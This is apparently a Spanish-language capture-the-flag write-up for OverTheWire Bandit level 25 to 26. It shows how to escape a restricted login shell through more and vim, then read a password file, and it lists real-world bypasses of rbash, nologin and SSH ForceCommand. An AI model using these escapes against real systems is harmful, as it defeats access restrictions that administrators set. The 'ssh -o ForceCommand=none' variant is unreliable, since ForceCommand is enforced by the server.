# OverTheWire - Bandit: Nivel 25 → 26 - Clave SSH y escape de shell restringido

## Comando(s)

Copiar la clave SSH a local:
```bash
scp -P 2220 bandit25@bandit.labs.overthewire.org:/home/bandit25/bandit26.sshkey ~/bandit26.key
chmod 600 ~/bandit26.key
```

Reducir terminal y conectar:
```bash
stty rows 5 cols 80
ssh -i ~/bandit26.key -t bandit26@bandit.labs.overthewire.org -p 2220
```

Escape desde `more`:
```
v
:set shell=/bin/bash
:shell
```

Leer password:
```bash
cat /etc/bandit_pass/bandit26
```

## Concepto

El usuario `bandit26` tiene como shell un programa llamado `showtext` que muestra un arte ASCII con `more` y termina. Si la terminal es suficientemente pequeña, `more` entra en modo paginado. En `more`, la tecla `v` abre el archivo en `vim`. Desde `vim` se puede ejecutar una shell, rompiendo la restricción.

## Aplicación real

- **Bypass de shells restringidos**: usuarios con shell `/bin/rbash`, `rbash`, `nologin` o programas forzados (`ForceCommand` en SSH) a veces pueden escapar a través de paginadores, editores o binarios setuid.
- **Auditoría de SSH**: revisar `ForceCommand` y shells asignados en `/etc/passwd`.
- **Escapes comunes**: `less`, `more`, `vim`, `man`, `git`.

## Errores comunes

- No usar `stty` ni achicar la terminal, por lo que `more` no pagina y la sesión se cierra.
- No usar `-t` en `ssh`, por lo que no hay pseudo-terminal.
- Olvidar ejecutar `:set shell=/bin/bash` antes de `:shell`.
- No saber que `more` permite abrir el visor con `v`.

## Variantes útiles

- `ssh -i key -t user@host /bin/bash` fuerza un shell específico.
- En `less`: `!bash` abre shell directamente.
- En `vim`: `:!comando` ejecuta un comando; `:shell` abre shell interactivo.
- `ssh -o ForceCommand=none user@host` intenta bypassar ForceCommand.
- `env`, `SHELL=/bin/bash` pueden ayudar en otros escapes.
